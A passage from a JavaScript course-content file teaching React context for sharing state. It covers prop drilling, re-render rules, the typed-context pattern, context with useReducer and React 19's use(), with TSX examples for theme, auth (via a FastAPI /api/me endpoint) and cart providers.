/* Week 2: Building real applications — content only. Rendered by assets/js/render.js; loaded on demand by assets/js/app.js.
   The week revision sheet is built from each day's "rev" bullets. */
JSC.registerWeek({w:2,days:[
/* ===== Day 6 ===== */
{
  n: 6,
  title: "Sharing state",
  goal: `<b>By the end of today</b> you can share state across a component tree with context without accidentally re-rendering the whole app (typed context, custom hook, memoised value, split state/dispatch), and you can classify any piece of state as local UI, global client, server cache or URL state and pick the right tool for each: <code>useState</code>, context, Zustand, Redux Toolkit, TanStack Query or the URL.`,
  rev: [
    `<b>Context is dependency injection, not a state manager.</b> <code>createContext(default)</code> makes a channel; a provider (<code>&lt;Ctx value={v}&gt;</code> in React 19, <code>&lt;Ctx.Provider value={v}&gt;</code> everywhere) puts a value on it; <code>useContext(Ctx)</code> reads the <i>nearest provider above</i>. The default is used only when there is no provider at all.`,
    `<b>Every consumer re-renders when the provider value changes</b> (compared with <code>Object.is</code>), and <code>React.memo</code> does not stop it. So: memoise the value object (<code>useMemo</code>/<code>useCallback</code>), split rarely-changing from often-changing values, and put <code>state</code> and <code>dispatch</code> in separate contexts. Context has no selectors.`,
    `<b>Typed context pattern:</b> <code>createContext&lt;AuthValue | null&gt;(null)</code> + a <code>useAuth()</code> hook that throws outside the provider. One file per context; the provider owns the state; consumers never import the raw context.`,
    `<b>Four kinds of state:</b> local UI (<code>useState</code>), global client (context / Zustand / Redux Toolkit), <b>server cache</b> (TanStack Query or RTK Query, never hand-copied into Redux), and <b>URL</b> (search params: filters, page, tab). Most "we need Redux" problems are server-cache problems.`,
    `<b>External stores</b> (Redux, Zustand, Jotai's store) sit outside React and connect through <code>useSyncExternalStore(subscribe, getSnapshot)</code>. Components subscribe with a <b>selector</b> and re-render only when the selected value changes; a selector that returns a new object every time defeats this (Zustand: wrap with <code>useShallow</code>; Redux: <code>createSelector</code>).`
  ],
  topics: [
    /* ------------------------------------------------------------------ */
    {
      id: "d6-context",
      title: "Context: avoiding prop drilling without hurting performance",
      lv: ["fresher", "mid", "senior", "lead"],
      eli5: `<p>Imagine an office building where the CEO wants every employee to know today's Wi-Fi password. Without a better system, the CEO tells the VP, the VP tells the director, the director tells the manager, and the manager tells the intern. The VP, director and manager don't need the password themselves; they are just passing it along. If one of them forgets, the intern never gets it. That is <b>prop drilling</b>.</p>
<p><b>Context</b> is the building's notice board. The CEO pins the password on the board on one floor (the <b>provider</b>), and anyone on that floor or any floor below can walk up and read it (<code>useContext</code>). The people in the middle no longer carry a message they don't care about.</p>
<p>But notice boards have a cost. When the CEO pins a <i>new</i> notice, <b>everyone</b> who reads that board gets a tap on the shoulder: "the board changed, go look again", even if the line they care about didn't change. If the CEO re-pins the same notice on a fresh sheet of paper every five minutes, everyone keeps getting interrupted for nothing. Today is about using the board for the right things and not re-pinning it needlessly.</p>`,
      what: `<p><b>Context</b> lets a component provide a value to its entire subtree without passing it through props at every level. It has three parts:</p>
<ul class="pts">
<li><b><code>createContext(defaultValue)</code></b> creates a context object. Call it once, at module level (never inside a component, or every render creates a new, unrelated context). The <code>defaultValue</code> is used <i>only</i> when a component reads the context and there is <b>no matching provider above it</b>. It is not a fallback for <code>undefined</code> values and it never changes.</li>
<li><b>The provider</b> puts a value into the tree. In React 19 you can render the context itself as the provider: <code>&lt;ThemeContext value={theme}&gt;…&lt;/ThemeContext&gt;</code>. The older <code>&lt;ThemeContext.Provider value={theme}&gt;</code> still works in React 19; the React team has said it will be deprecated in a future version, so new code can use the short form, and existing code doesn't need a rush rewrite. If you support React 18, you must use <code>.Provider</code>.</li>
<li><b><code>useContext(SomeContext)</code></b> returns the value from the <b>nearest provider above</b> the calling component. "Above" means in the component tree, not the file. A provider rendered <i>by the same component</i> that calls <code>useContext</code> does not count; the hook looks upward from the calling component.</li>
</ul>
<h5>Prop drilling, and when it is actually fine</h5>
<p>Prop drilling is passing a prop through components that don't use it, only to reach a deep descendant. Two or three levels is normal React and is <i>explicit</i>: you can see where data comes from. It becomes a problem when the same value (the current user, the theme, the locale, a feature-flag client) is threaded through ten components, every intermediate component's signature changes when the data changes, and refactors become painful.</p>
<p>Before reaching for context, try <b>composition</b>: let the parent render the deep child directly and pass it down as <code>children</code> or a slot prop. The intermediate layout component then doesn't need to know about the data at all:</p>
<ul class="pts">
<li>Drilled: <code>&lt;Page user={user}&gt;</code> → <code>&lt;Layout user={user}&gt;</code> → <code>&lt;Sidebar user={user}&gt;</code> → <code>&lt;Avatar user={user}&gt;</code>.</li>
<li>Composed: <code>&lt;Layout sidebar={&lt;Sidebar avatar={&lt;Avatar user={user} /&gt;} /&gt;}&gt;</code>. <code>Layout</code> and <code>Sidebar</code> just place what they are given.</li>
</ul>
<p>Context is the right tool when <b>many components at different depths</b> need the same value, and that value is <b>app-wide or section-wide</b>: theme, current user and permissions, locale and translations, a router, a query client, a design-system configuration, a form's internal state shared between compound components.</p>
<h5>The typed-context pattern (use this by default)</h5>
<p>In TypeScript, the cleanest pattern is: create the context with a <code>null</code> default, keep the raw context private to its module, and export a <b>provider component</b> plus a <b>custom hook</b> that throws when there is no provider:</p>
<ul class="pts">
<li><code>const AuthContext = createContext&lt;AuthValue | null&gt;(null);</code> The <code>null</code> default is honest: there is no sensible "default user".</li>
<li><code>useAuth()</code> calls <code>useContext</code>, throws a clear error if the result is <code>null</code>, and returns a non-null <code>AuthValue</code>. Consumers get proper types without <code>!</code> or <code>?.</code> everywhere, and a missing provider fails loudly in development instead of producing silent <code>undefined</code> bugs.</li>
<li>When a real default exists (a theme of <code>"light"</code>), a non-null default is fine and lets components render in isolation (tests, Storybook) without a provider.</li>
</ul>
<h5>Re-render behaviour: the part that matters for performance</h5>
<ul class="pts">
<li>When a provider re-renders with a <b>new value</b>, React compares it with the previous one using <code>Object.is</code>. If different, <b>every component that reads that context</b> below it is re-rendered, no matter how deep.</li>
<li>This happens <b>even if the consumer is wrapped in <code>React.memo</code></b> and even if the consumer only uses one field of the value that didn't change. <code>memo</code> compares props; context is not a prop. Context has no built-in selector.</li>
<li>An object or array literal in <code>value={{ user, logout }}</code> is a <b>new object every render</b> of the provider component, so <code>Object.is</code> always says "changed" and every consumer re-renders whenever the provider's parent re-renders for any reason. Fix: <code>useMemo</code> the value object and <code>useCallback</code> the functions inside it (or let the React Compiler do this; Day 11).</li>
<li>Components between the provider and the consumer that <b>don't read the context</b> are not re-rendered by the context change itself. They only re-render if their own parent re-renders them. This is why passing <code>children</code> through a provider component is cheap: the children elements were created by the provider's parent and are the same objects, so React bails out on them.</li>
</ul>
<h5>Three tools for keeping context cheap</h5>
<ul class="pts">
<li><b>Memoise the value.</b> <code>const value = useMemo(() =&gt; ({ user, logout }), [user, logout]);</code></li>
<li><b>Split by change frequency.</b> Don't put the theme, the current user and a fast-changing "unread count" in one <code>AppContext</code>. One context per concern; a change to one only re-renders its own consumers.</li>
<li><b>Split state from dispatch.</b> With <code>useReducer</code>, put <code>state</code> in one context and <code>dispatch</code> in another. <code>dispatch</code> is stable for the component's lifetime, so components that only <i>trigger</i> updates (buttons, forms) read the dispatch context and never re-render when the state changes.</li>
</ul>
<h5>Context + useReducer</h5>
<p>Day 4 introduced <code>useReducer</code>. Combined with context it gives you a small, dependency-free "store": a provider owns <code>useReducer(reducer, initial)</code>, exposes state and dispatch through two contexts, and descendants dispatch typed actions. It is ideal for a <b>feature-sized</b> piece of client state (a multi-step wizard, a canvas editor's selection, a shopping cart before checkout). It is not ideal for very frequently changing global state read by hundreds of components, because every state change re-renders every state consumer.</p>
<h5>React 19: <code>use(Context)</code></h5>
<p>React 19 added the <code>use</code> API. <code>use(SomeContext)</code> reads context like <code>useContext</code>, but unlike hooks it <b>may be called conditionally</b>, inside <code>if</code> blocks and loops (still only inside a component or a custom hook, not in plain functions or event handlers). That lets you skip reading a context on branches that don't need it. <code>useContext</code> remains fully supported and is what you'll see in most codebases; treat <code>use</code> as a React 19-only option and check the official docs for the current rules (for example, <code>use</code> is not allowed inside a <code>try</code>/<code>catch</code> block).</p>
<h5>When context is the wrong tool</h5>
<ul class="pts">
<li><b>Server data</b> (lists of products, orders, the dashboard's numbers). You'd be re-implementing caching, deduplication, refetching and invalidation by hand. Use TanStack Query (Day 7). The current user is a borderline case: a small auth context that wraps the <code>/api/me</code> result is common and fine; many teams also back it with a query.</li>
<li><b>High-frequency updates read by many components</b> (mouse position, a live-editing document, a ticking timer, websocket prices). Every update re-renders every consumer. Use an external store with selectors (Zustand, Redux, Jotai; next topic) or keep the state local.</li>
<li><b>State that should be in the URL</b> (filters, current tab, page number): use search params so it survives refresh and can be shared (Day 8).</li>
<li><b>Avoiding two levels of props.</b> Explicit props are easier to follow and test.</li>
</ul>`,
      why: `<p>React data flows one way: parents pass props to children. That is what makes React apps predictable, but some values are needed nearly everywhere: who is logged in, what theme is active, which language to render, which feature flags are on. Before context existed in its modern form, there were two options. You could thread those values through every intermediate component (prop drilling), so a <code>Layout</code> that only arranges boxes had to accept and forward <code>user</code>, <code>theme</code> and <code>locale</code>. Or you used a global singleton imported directly into components, which React didn't know about: changing it didn't re-render anything, and tests had to monkey-patch modules.</p>
<p>React had a "legacy context" API in the class-component era (<code>contextTypes</code>, <code>getChildContext</code>) that was officially discouraged because updates could be blocked by any <code>shouldComponentUpdate</code> in between. The modern API (<code>createContext</code>, providers, later <code>useContext</code>) fixed that: React itself propagates changes to every consumer, skipping memoised components in between correctly. Libraries such as React Router, TanStack Query, React Redux and every design system use it to inject their client or store into your tree; the store or client itself rarely changes, so this is cheap.</p>
<p>What context did <i>not</i> solve is fine-grained updates: it tells all consumers "the value changed", not "the field you care about changed". That gap is why state libraries with selectors still exist (next topic), and why knowing context's re-render rules is a standard mid-to-senior interview topic.</p>`,
      diagram: {
        html: flow([
          ["App", "&lt;AuthProvider&gt; owns user state", "g"],
          ["Provider", "value = useMemo({ user, logout })", "w"],
          ["Layout / Sidebar", "don't read context: not re-rendered by it", ""],
          ["Consumers", "useAuth() in Navbar, Avatar, AdminMenu", "g"],
          ["Value changes", "Object.is(old, new) false → every consumer re-renders, even inside memo", "r"]
        ]),
        steps: [
          `<code>AuthProvider</code> holds the state (here: the user loaded from FastAPI <code>/api/me</code>) and renders the context provider with a <b>memoised</b> value object, wrapping its <code>children</code>.`,
          `Intermediate components such as <code>Layout</code> and <code>Sidebar</code> receive nothing auth-related. They are passed in as <code>children</code>, so when the provider's state changes React reuses those same elements and does not re-render them on account of the context.`,
          `Deep components call <code>useAuth()</code>. During render React walks up to the nearest provider for that context and records that this component <b>depends</b> on it.`,
          `When the provider renders with a value that is not <code>Object.is</code>-equal to the previous one, React finds every dependent component below and schedules it to re-render, bypassing <code>React.memo</code>. If the value is the same object, nothing below is touched.`,
          `Therefore: memoise the value, split contexts by concern, and give dispatch-only components their own context so they never re-render on state changes.`
        ]
      },
      ex: [
        {
          t: "Prop drilling, then the same thing with context",
          lang: "tsx",
          code: `// BEFORE: theme is threaded through components that don't use it
type Theme = "light" | "dark";

function App() {
  const theme: Theme = "dark";
  return <Page theme={theme} />;
}
function Page({ theme }: { theme: Theme }) {
  return <Toolbar theme={theme} />;         // Page doesn't care about theme
}
function Toolbar({ theme }: { theme: Theme }) {
  return <ThemedButton theme={theme} />;    // neither does Toolbar
}
function ThemedButton({ theme }: { theme: Theme }) {
  return <button className={"btn btn-" + theme}>Save</button>;
}

// AFTER: src/theme/ThemeContext.ts
import { createContext, useContext } from "react";

export type Theme = "light" | "dark";
export const ThemeContext = createContext<Theme>("light"); // default: used only with no provider

// src/App.tsx
export function App() {
  return (
    <ThemeContext value="dark">   {/* React 19; on React 18 write <ThemeContext.Provider value="dark"> */}
      <Page />
    </ThemeContext>
  );
}
function Page() { return <Toolbar />; }
function Toolbar() { return <ThemedButton />; }
function ThemedButton() {
  const theme = useContext(ThemeContext);   // "dark": nearest provider above
  return <button className={"btn btn-" + theme}>Save</button>;
}`,
          out: `<button class="btn btn-dark">Save</button>
(Render <ThemedButton /> with no provider above it, e.g. in a test, and you get "btn btn-light" from the default.)`,
          note: `<p>The two code halves are alternatives, not one file. The default value <code>"light"</code> is only used when no provider exists above the reader. Context is created once at module level.</p>`
        },
        {
          t: "Typed context with a custom hook that throws outside the provider",
          lang: "tsx",
          code: `// src/theme/theme-context.ts  (context + hook: no components, keeps Vite Fast Refresh happy)
import { createContext, useContext } from "react";

export type Theme = "light" | "dark";
export type ThemeContextValue = {
  theme: Theme;
  toggleTheme: () => void;
};

export const ThemeContext = createContext<ThemeContextValue | null>(null);

export function useTheme(): ThemeContextValue {
  const ctx = useContext(ThemeContext);
  if (ctx === null) {
    throw new Error("useTheme() must be used inside <ThemeProvider>");
  }
  return ctx; // narrowed to ThemeContextValue: no "!" needed by callers
}

// src/theme/ThemeProvider.tsx
import { useCallback, useEffect, useMemo, useState, type ReactNode } from "react";
import { ThemeContext, type Theme } from "./theme-context";

function initialTheme(): Theme {
  const saved = localStorage.getItem("theme");
  if (saved === "light" || saved === "dark") return saved;
  return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
}

export function ThemeProvider({ children }: { children: ReactNode }) {
  const [theme, setTheme] = useState<Theme>(initialTheme); // lazy initialiser: runs once

  useEffect(() => {
    document.documentElement.dataset.theme = theme;      // sync to the outside world
    localStorage.setItem("theme", theme);
  }, [theme]);

  const toggleTheme = useCallback(
    () => setTheme((t) => (t === "light" ? "dark" : "light")),
    []
  );

  const value = useMemo(() => ({ theme, toggleTheme }), [theme, toggleTheme]);

  return <ThemeContext value={value}>{children}</ThemeContext>;
}

// anywhere below:
import { useTheme } from "./theme/theme-context";

export function ThemeToggle() {
  const { theme, toggleTheme } = useTheme();
  return (
    <button onClick={toggleTheme} aria-pressed={theme === "dark"}>
      {theme === "dark" ? "Switch to light" : "Switch to dark"}
    </button>
  );
}`,
          out: `Inside <ThemeProvider>: the button toggles, <html data-theme="dark"> updates, the choice survives reload.
Outside it: Error: useTheme() must be used inside <ThemeProvider>`,
          note: `<p>Why two files: the Vite React template's ESLint config includes <code>react-refresh/only-export-components</code>, which warns when a file exports both components and non-components (Fast Refresh can then only do a full reload). Putting the context and hook in a <code>.ts</code> file and the provider in a <code>.tsx</code> file avoids the warning. The <code>useMemo</code>/<code>useCallback</code> pair keeps <code>value</code> the same object unless <code>theme</code> actually changes.</p>`
        },
        {
          t: "Auth context backed by FastAPI /api/me",
          lang: "tsx",
          code: `// src/auth/auth-context.ts
import { createContext, useContext } from "react";

export type User = { id: number; email: string; name: string; roles: string[] };

export type AuthState =
  | { status: "loading"; user: null }
  | { status: "anonymous"; user: null }
  | { status: "authenticated"; user: User };

export type AuthContextValue = AuthState & {
  refresh: () => Promise<void>;
  logout: () => Promise<void>;
};

export const AuthContext = createContext<AuthContextValue | null>(null);

export function useAuth(): AuthContextValue {
  const ctx = useContext(AuthContext);
  if (ctx === null) throw new Error("useAuth() must be used inside <AuthProvider>");
  return ctx;
}

// src/auth/AuthProvider.tsx
import { useCallback, useEffect, useMemo, useState, type ReactNode } from "react";
import { AuthContext, type AuthState, type User } from "./auth-context";

async function fetchMe(signal?: AbortSignal): Promise<User | null> {
  // FastAPI reads the httpOnly session cookie and returns the user, or 401
  const res = await fetch("/api/me", { credentials: "include", signal });
  if (res.status === 401) return null;
  if (!res.ok) throw new Error("GET /api/me failed with " + res.status);
  return (await res.json()) as User;
}

function toState(user: User | null): AuthState {
  return user ? { status: "authenticated", user } : { status: "anonymous", user: null };
}

export function AuthProvider({ children }: { children: ReactNode }) {
  const [state, setState] = useState<AuthState>({ status: "loading", user: null });

  useEffect(() => {
    const controller = new AbortController();
    fetchMe(controller.signal)
      .then((user) => setState(toState(user)))
      .catch(() => {
        if (!controller.signal.aborted) setState(toState(null));
      });
    return () => controller.abort(); // StrictMode mounts twice in dev: abort the first request
  }, []);

  const refresh = useCallback(async () => {
    setState(toState(await fetchMe()));
  }, []);

  const logout = useCallback(async () => {
    await fetch("/api/logout", { method: "POST", credentials: "include" });
    setState(toState(null));
  }, []);

  const value = useMemo(() => ({ ...state, refresh, logout }), [state, refresh, logout]);

  return <AuthContext value={value}>{children}</AuthContext>;
}

// src/components/UserMenu.tsx
import { useAuth } from "../auth/auth-context";

export function UserMenu() {
  const auth = useAuth();
  if (auth.status === "loading") return <span aria-busy="true">…</span>;
  if (auth.status === "anonymous") return <a href="/login">Sign in</a>;
  return (                                   // narrowed: auth.user is User here
    <div>
      <span>{auth.user.name}</span>
      {auth.user.roles.includes("admin") && <a href="/admin">Admin</a>}
      <button onClick={() => void auth.logout()}>Sign out</button>
    </div>
  );
}`,
          out: `First paint: "…"   →  after /api/me returns 200: "Ada Lovelace  Admin  Sign out"
If /api/me returns 401: "Sign in"`,
          note: `<p>The discriminated union (<code>status</code>) means TypeScript knows <code>user</code> is non-null only when authenticated, so the UI can't forget the loading state. Showing "Admin" based on roles is only a UX nicety: FastAPI must still enforce permissions on every request. Day 7 shows how to back this with TanStack Query (caching, retries, refetch on focus), and Day 8 covers login, refresh tokens and protected routes.</p>`
        },
        {
          t: "Proving the re-render rules: inline value vs memoised value, and memo doesn't help",
          lang: "tsx",
          code: `import { createContext, memo, useContext, useMemo, useState } from "react";

type Settings = { currency: string; locale: string };
const SettingsContext = createContext<Settings>({ currency: "USD", locale: "en-US" });

const Price = memo(function Price({ amount }: { amount: number }) {
  const { currency, locale } = useContext(SettingsContext);
  console.log("render Price", amount);
  return <span>{new Intl.NumberFormat(locale, { style: "currency", currency }).format(amount)}</span>;
});

export function Shop() {
  const [cartOpen, setCartOpen] = useState(false); // unrelated state
  const [currency, setCurrency] = useState("EUR");

  // BUG version: a new object every render of Shop
  // const settings = { currency, locale: "de-DE" };

  // FIXED version: same object until currency changes
  const settings = useMemo(() => ({ currency, locale: "de-DE" }), [currency]);

  return (
    <SettingsContext value={settings}>
      <button onClick={() => setCartOpen((o) => !o)}>{cartOpen ? "Close" : "Open"} cart</button>
      <button onClick={() => setCurrency((c) => (c === "EUR" ? "USD" : "EUR"))}>Toggle currency</button>
      <Price amount={10} />
      <Price amount={25} />
    </SettingsContext>
  );
}`,
          out: `With the BUG version, clicking "Open cart":
  render Price 10
  render Price 25        <- memo didn't help: the context value changed identity
With the FIXED version, clicking "Open cart":
  (nothing logged)       <- props equal, context value is the same object
Clicking "Toggle currency" (either version):
  render Price 10
  render Price 25        <- correct: the value really changed`,
          note: `<p>In development with StrictMode each render is called twice, so you may see each log line doubled; that's expected (Day 5). The lesson: <code>memo</code> protects against <i>prop</i> changes only. A context the component reads is an input that bypasses <code>memo</code> entirely.</p>`
        },
        {
          t: "Context + useReducer with separate state and dispatch contexts",
          lang: "tsx",
          code: `// src/cart/cart-context.ts
import { createContext, useContext, type Dispatch } from "react";

export type CartItem = { productId: number; name: string; price: number; qty: number };
export type CartState = { items: CartItem[] };
export type CartAction =
  | { type: "added"; item: Omit<CartItem, "qty"> }
  | { type: "qtyChanged"; productId: number; qty: number }
  | { type: "removed"; productId: number }
  | { type: "cleared" };

export function cartReducer(state: CartState, action: CartAction): CartState {
  switch (action.type) {
    case "added": {
      const existing = state.items.find((i) => i.productId === action.item.productId);
      if (existing) {
        return {
          items: state.items.map((i) =>
            i.productId === action.item.productId ? { ...i, qty: i.qty + 1 } : i
          ),
        };
      }
      return { items: [...state.items, { ...action.item, qty: 1 }] };
    }
    case "qtyChanged":
      return {
        items: state.items.map((i) =>
          i.productId === action.productId ? { ...i, qty: Math.max(1, action.qty) } : i
        ),
      };
    case "removed":
      return { items: state.items.filter((i) => i.productId !== action.productId) };
    case "cleared":
      return { items: [] };
  }
}

const CartStateContext = createContext<CartState | null>(null);
const CartDispatchContext = createContext<Dispatch<CartAction> | null>(null);
export { CartStateContext, CartDispatchContext };

export function useCart(): CartState {
  const s = useContext(CartStateContext);
  if (!s) throw new Error("useCart() must be used inside <CartProvider>");
  return s;
}
export function useCartDispatch(): Dispatch<CartAction> {
  const d = useContext(CartDispatchContext);
  if (!d) throw new Error("useCartDispatch() must be used inside <CartProvider>");
  return d;
}

// src/cart/CartProvider.tsx
import { useReducer, type ReactNode } from "react";
import { CartDispatchContext, CartStateContext, cartReducer } from "./cart-context";

export function CartProvider({ children }: { children: ReactNode }) {
  const [state, dispatch] = useReducer(cartReducer, { items: [] });
  // state is a new object only when the reducer returns one; dispatch never changes
  return (
    <CartDispatchContext value={dispatch}>
      <CartStateContext value={state}>{children}</CartStateContext>
    </CartDispatchContext>
  );
}

// A product card only dispatches: it never re-renders when the cart changes
import { memo } from "react";
import { useCart, useCartDispatch } from "./cart/cart-context";

export const AddToCartButton = memo(function AddToCartButton(props: {
  productId: number; name: string; price: number;
}) {
  const dispatch = useCartDispatch();
  return <button onClick={() => dispatch({ type: "added", item: props })}>Add to cart</button>;
});

// The badge reads state: it re-renders on every cart change (that's what we want)
export function CartBadge() {
  const { items } = useCart();
  const count = items.reduce((n, i) => n + i.qty, 0);
  return <span aria-label={count + " items in cart"}>{count}</span>;
}`,
          out: `Click "Add to cart" on a product: CartBadge re-renders (0 → 1); the 40 AddToCartButtons on the page do not.`,
          note: `<p>If you put <code>{ state, dispatch }</code> in a single context, every button would re-render on every cart change. The reducer has no <code>default</code> branch: with the action union fully handled, TypeScript knows the switch is exhaustive. Day 4 covers reducer design in depth.</p>`
        },
        {
          t: "React 19: reading context conditionally with use()",
          lang: "tsx",
          code: `import { use, type ReactNode } from "react";
import { ThemeContext } from "./theme/theme-context";

// useContext must be called unconditionally (rules of hooks).
// use(Context) may be called inside a condition (React 19 only).
export function Panel({ themed, children }: { themed: boolean; children: ReactNode }) {
  if (!themed) {
    return <section className="panel">{children}</section>;
  }
  const ctx = use(ThemeContext);           // fine: conditional call
  const theme = ctx?.theme ?? "light";     // raw context is nullable; handle "no provider"
  return <section className={"panel panel-" + theme}>{children}</section>;
}`,
          out: `<Panel themed={false}>  → <section class="panel">
<Panel themed>         → <section class="panel panel-dark"> (inside a dark ThemeProvider)`,
          note: `<p><code>use</code> is new in React 19 and also unwraps promises (Day 7). It is still only callable from components and hooks. The practical benefit for context is small: you avoid subscribing on branches that don't need the value. Most teams keep using <code>useContext</code> (or a custom hook built on it) unless they need the conditional call.</p>`
        },
        {
          t: "Composing providers and putting them in one place",
          lang: "tsx",
          code: `// src/main.tsx
import { StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { ThemeProvider } from "./theme/ThemeProvider";
import { AuthProvider } from "./auth/AuthProvider";
import { CartProvider } from "./cart/CartProvider";
import { App } from "./App";

createRoot(document.getElementById("root")!).render(
  <StrictMode>
    {/* Order matters only if one provider uses another's hook:
        CartProvider could call useAuth() because AuthProvider is above it. */}
    <ThemeProvider>
      <AuthProvider>
        <CartProvider>
          <App />
        </CartProvider>
      </AuthProvider>
    </ThemeProvider>
  </StrictMode>
);

// Overriding a context for a subtree: the nearest provider wins
import type { ReactNode } from "react";
import { ThemeContext } from "./theme/theme-context";

export function PrintPreview({ children }: { children: ReactNode }) {
  return (
    <ThemeContext value={{ theme: "light", toggleTheme: () => {} }}>
      {children /* everything in here sees "light", regardless of the app theme */}
    </ThemeContext>
  );
}`,
          note: `<p>Nesting providers is cheap; the "provider pyramid" is cosmetic, not a performance problem. Scope matters more than count: put a provider as <b>low</b> as it can go (a <code>WizardProvider</code> wraps only the wizard route), so fewer components sit under a changing value. The inline object in <code>PrintPreview</code> is acceptable only because <code>PrintPreview</code> rarely re-renders; with frequent re-renders, hoist it to a module constant.</p>`
        },
        {
          t: "Testing a component that needs context",
          lang: "tsx",
          code: `// src/components/UserMenu.test.tsx  (Vitest + Testing Library; Day 14 goes deeper)
import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { AuthContext, type AuthContextValue } from "../auth/auth-context";
import { UserMenu } from "./UserMenu";

function renderWithAuth(value: AuthContextValue) {
  return render(
    <AuthContext value={value}>
      <UserMenu />
    </AuthContext>
  );
}

describe("UserMenu", () => {
  it("shows the admin link for admins", () => {
    renderWithAuth({
      status: "authenticated",
      user: { id: 1, email: "ada@example.com", name: "Ada", roles: ["admin"] },
      refresh: vi.fn(),
      logout: vi.fn(),
    });
    expect(screen.getByRole("link", { name: "Admin" })).toBeInTheDocument();
  });

  it("throws a helpful error without a provider", () => {
    vi.spyOn(console, "error").mockImplementation(() => {}); // silence React's error log
    expect(() => render(<UserMenu />)).toThrow(/inside <AuthProvider>/);
  });
});`,
          note: `<p>Exporting the raw context (in addition to the hook) makes tests trivial: provide a fake value directly, no network mocking. The <code>toBeInTheDocument</code> matcher needs <code>@testing-library/jest-dom</code> set up in Vitest.</p>`
        }
      ],
      internals: `<p><b>What a context object is.</b> <code>createContext</code> returns a plain object with a <code>$$typeof</code> marker, a slot for the current value (initialised to the default), and (in React 19) the object itself is usable as a provider element type; <code>Context.Provider</code> refers to a provider type tied to the same context. There is no global registry: the context's identity <i>is</i> that object, which is why creating it inside a component (a new object per render) breaks everything, and why two copies of a library bundled twice produce two unrelated contexts.</p>
<p><b>Providing during render.</b> React renders the fiber tree depth-first (Day 12). When it begins work on a provider fiber, it <b>pushes</b> the provider's value onto an internal stack and stores it as the context's current value; when it completes that fiber's subtree, it <b>pops</b> back to the previous value. So during the render of any component, the context's "current value" is exactly the value of the nearest enclosing provider, or the default if none was pushed. This is why there is no runtime tree walk on every read: reading is O(1).</p>
<p><b>Reading records a dependency.</b> <code>useContext</code> (and <code>use(Context)</code>) read the current value and also add the context to the reading fiber's <b>dependencies</b> list, along with the value it saw. This list is how React later knows which fibers care about which context. Because <code>use</code> records the dependency at the point of the call, a conditional <code>use</code> only subscribes on renders where it actually runs; <code>useContext</code> participates in the hooks order like other hooks, so it must be unconditional.</p>
<p><b>Propagating a change.</b> When a provider re-renders, React compares the new value with the old using <code>Object.is</code>. If equal, the provider can bail out and React may skip the whole subtree if nothing else changed. If different, React must find every fiber below whose dependencies include this context and mark it (and the path to it) as needing work, even if an ancestor bailed out via <code>memo</code> or unchanged props. Older versions walked the subtree eagerly at the provider; newer versions propagate more lazily while descending during render. Either way the observable rule is the same: <b>all dependent consumers re-render; non-consumers between them are not re-rendered because of the context</b>.</p>
<p><b>Why there are no selectors.</b> A dependency entry records <i>the context</i>, not which fields you used. React can't know that <code>Navbar</code> only looked at <code>user.name</code>. The React team has experimented with context selectors, but there is no stable API for it at the time of writing; libraries such as <code>use-context-selector</code> emulate it, and external stores with <code>useSyncExternalStore</code> are the mainstream answer.</p>
<p><b>Batching and transitions.</b> A context change is just a state update in the provider's owner, so it is batched and prioritised like any other update (Day 12): several <code>setState</code> calls in one event produce one provider render and one round of consumer renders. Wrapping the update in <code>startTransition</code> marks the consumer re-renders as interruptible.</p>`,
      prod: `<p><b>Typical context inventory in a React + FastAPI app:</b> <code>ThemeProvider</code>, <code>AuthProvider</code> (current user from <code>/api/me</code>, roles for UI gating), <code>I18nProvider</code> (locale and messages), a <code>FeatureFlagsProvider</code>, plus library providers: <code>QueryClientProvider</code> (TanStack Query), the router, perhaps a toast/notification provider. Most of these change rarely: the theme on a click, the user on login/logout. That is context's sweet spot.</p>
<p><b>What goes wrong at scale.</b></p>
<ul class="pts">
<li><b>The god context.</b> One <code>AppContext</code> holding user, theme, cart, notifications, sidebar-open, and a websocket feed. Every notification re-renders every component that reads any of it. The React DevTools Profiler shows hundreds of components re-rendering on each websocket message. Fix: split by concern and change frequency; move the high-frequency feed into an external store with selectors.</li>
<li><b>Unmemoised values.</b> <code>value={{ user, setUser }}</code> in a provider that sits under a frequently re-rendering parent means all consumers re-render on every parent render. A one-line <code>useMemo</code> fixes it. The React Compiler (Day 11), where adopted, can memoise this automatically, but you should still understand the rule to debug it.</li>
<li><b>Server data in context.</b> A <code>ProductsProvider</code> that fetches <code>/api/products</code> in an effect and exposes <code>{ products, reload }</code>. It grows ad-hoc caching, loading flags, error handling, and stale data after mutations. Teams eventually replace it with TanStack Query, which FastAPI + Redis caching complements nicely (HTTP cache headers, ETags).</li>
<li><b>Auth state drift.</b> The auth context says "logged in" but the session cookie expired. Handle 401s centrally (a fetch wrapper or query client <code>onError</code>) that calls <code>refresh()</code> or logs out, so the context follows the server's truth. Never trust the client-side role check for security; FastAPI dependencies (<code>Depends(get_current_user)</code>) enforce it.</li>
<li><b>Providers too high.</b> A form-wizard provider placed at the app root keeps wizard state alive after you leave the page, and every keystroke in the wizard re-renders consumers app-wide. Put feature providers in the feature's route layout.</li>
<li><b>SSR and multiple React copies.</b> If a component library bundles its own React or its own copy of a context module, its consumers can't see your provider ("why is it always the default value?"). Check <code>npm ls react</code> and make libraries declare React as a peer dependency.</li>
</ul>`,
      iq: [
        ["fresher", "What is prop drilling and how does context solve it?", `<p>Prop drilling is passing a prop through intermediate components that don't use it, just to reach a deep descendant. Context lets a provider make a value available to its whole subtree; any descendant reads it with <code>useContext</code> without the intermediates knowing. It's not automatically "better": for two or three levels, explicit props are clearer, and composition (passing elements as <code>children</code>) often removes the drilling without context.</p>`],
        ["fresher", "When is the default value passed to createContext used?", `<p>Only when a component reads the context and there is <b>no provider above it</b> in the tree. It is not used when a provider passes <code>undefined</code> (the consumer gets <code>undefined</code>), and it doesn't change when providers change. The tempting wrong answer is "it's the initial value of the state", but context has no state of its own; the provider's owner holds the state.</p>`],
        ["mid", "Why does a component wrapped in React.memo still re-render when a context value changes?", `<p><code>memo</code> only skips re-rendering when the <b>props</b> are shallowly equal. Context is a separate input: if the component reads a context whose provider value changed (by <code>Object.is</code>), React schedules that component directly, bypassing the memo check. <code>memo</code> does stop re-renders of components that <i>don't</i> read the context but whose parent re-rendered.</p>`],
